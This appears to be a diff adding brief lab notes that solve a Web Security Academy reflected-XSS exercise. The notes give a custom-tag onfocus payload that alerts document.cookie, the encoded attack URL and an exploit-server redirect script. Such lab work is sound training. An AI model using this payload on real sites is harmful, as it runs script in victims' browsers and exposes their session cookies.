@@ -1,0 +1,17 @@
+<my-tag onfocus='alert(document.cookie)' id="search" tabindex="1">
+
+/* custom tags should generally have a hyphen in their name
+my-tag 
+to make it automatic, 
+
+//the URL to be accessed by victim
+https://0af0007504ca996880e9940700d200c0.web-security-academy.net/?search=%3Cmy-tag+onfocus%3D%27alert(document.cookie)%27+id%3D%22search%22+tabindex%3D%221%22%3E#search
+
+the #search at the end would mean that the victim enters the part of the HTML where he just
+clicked the tab button and since the tabindex is 1 of the element "search".
+
+//using the exploit server script
+<script>
+    location = 'https://0af0007504ca996880e9940700d200c0.web-security-academy.net/?search=%3Cmy-tag+onfocus%3D%27alert(document.cookie)%27+id%3D%22search%22+tabindex%3D%221%22%3E#search'
+
+</script>
